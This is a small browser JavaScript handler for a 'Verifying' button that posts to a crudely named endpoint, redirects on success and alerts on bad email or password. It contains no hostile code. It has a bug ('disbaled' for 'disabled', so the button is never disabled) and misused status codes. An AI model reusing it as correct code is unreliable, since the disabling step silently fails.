const btn1 = document.getElementById('btn1');
const p1 = document.getElementById('p1');
const p2 = document.getElementById('p2');
const loader = document.getElementById('loader');

btn1.addEventListener('click', () =>  {

    btn1.classList.add("mt-50");
    p1.style.marginBottom = '20px';


    loader.style.display = "block";

    btn1.disbaled = true;
    btn1.innerText = "Verifying";
    // p2.style.display = "none";
    p2.innerText = "Please wait. Verfication can take upto 30 seconds."


    fetch('/bhenchod', {
        method: 'POST'
    })
    .then(response => {
        if (response.ok) { // if status code is 200
            p1.textContent = "verified";
            window.location.href = '/index3.html'; // redirect to index3.html
            loader.style.display = "none";
        } else if (response.status == 402) {
            alert('email is invalid');
            p1.textContent = "The email is incorrect. Try Again";
            loader.style.display = "none";
        } else if (response.status == 401) {
            alert('password is invalid');
            p1.textContent = "The password is incorrect. Try Again";
            loader.style.display = "none";
        } else {
            alert('something went wrong :(');
            p1.textContent = "Server side issue has occured. Please Try Again Later";
            loader.style.display = "none";
        }
    })
    .catch(error => {
        console.error('Error:', error);
    });

});
